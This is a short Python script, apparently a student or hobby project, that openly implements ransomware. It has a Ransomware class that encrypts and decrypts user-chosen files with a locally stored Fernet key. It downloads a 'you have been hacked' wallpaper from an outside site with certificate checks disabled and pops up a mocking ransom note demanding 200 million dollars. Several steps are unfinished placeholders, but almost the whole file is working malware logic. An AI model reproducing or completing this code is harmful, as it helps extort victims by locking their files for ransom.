# Sierra Maldonado
#!/usr/bin/env python3
import os
import datetime
import urllib.request
import ssl
import subprocess
from cryptography.fernet import Fernet

# Functions to write key and load key
def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("key.key", "rb").read()


class Ransomware:
    def __init__(self):
        self.sysRoot = os.path.expanduser('~')
        if not os.path.exists("key.key"):
            write_key()
        self.key = load_key()

    # Encrypt files using the Fernet symmetric key
    def encrypt_file(self):
        file_path = input("Enter the path of the file you want to encrypt: ")
        with open(file_path, "rb") as f:
            data = f.read()
        fernet = Fernet(self.key)
        encrypted = fernet.encrypt(data)
        with open(file_path, "wb") as f:
            f.write(encrypted)

    # Decrypt files using the Fernet symmetric key
    def decrypt_file(self):
        file_path = input("Enter the path of the file you want to decrypt: ")
        with open(file_path, "rb") as f:
            data = f.read()
        fernet = Fernet(self.key)
        decrypted = fernet.decrypt(data)
        with open(file_path, "wb") as f:
            f.write(decrypted)

    # Change Background (modify for Linux)
    def change_background(self):
        # Modify the code to change the wallpaper on your Linux distribution
        # Update the image URL and path accordingly
        image_url = "https://www.unigamesity.com/wp-content/uploads/2009/05/you-have-been-hacked.jpg"
        path = "/path/to/wallpaper.jpg"
        context = ssl._create_unverified_context()
        with urllib.request.urlopen(image_url, context=context) as u, open(path, 'wb') as f:
            f.write(u.read())
        # Modify the code to change the wallpaper on your Linux distribution
        # Update the command accordingly
        command = "command_to_change_wallpaper"  # Replace with the actual command
        subprocess.run(command, shell=True)

    # Linux Popup blocker (modify for Linux)
    def ransom_note(self):
        # Modify the code to display a notification or custom dialog on Linux
        # Replace the text with your own ransom note
        ransom_note_text = "Get ducked, NERD! I have stolen and locked away all your data. I will unlock your computer for a fee of 200 MILLION dollars.\nPlease send the money, and I will decrypt your files."
        command = f"notify-send 'Ransom Note' '{ransom_note_text}'"  # Replace with the actual command
        subprocess.run(command, shell=True)

    def attack_windows_server(self):
        while True:
            user_input = input("What would you like to do? (Encrypt, Pop-up, Background, Decrypt, or Exit): ")
            if user_input.lower() == "encrypt":
                # Encryption
                self.encrypt_file()

            elif user_input.lower() == "pop-up":
                # Display ransom note on Windows Server (modify for Linux)
                self.ransom_note()

            elif user_input.lower() == "background":
                # Change Windows Server background (modify for Linux)
                self.change_background()

            elif user_input.lower() == "decrypt":
                # Decryption
                self.decrypt_file()

            elif user_input.lower() == "exit":
                break

ransomware = Ransomware()
ransomware.attack_windows_server()
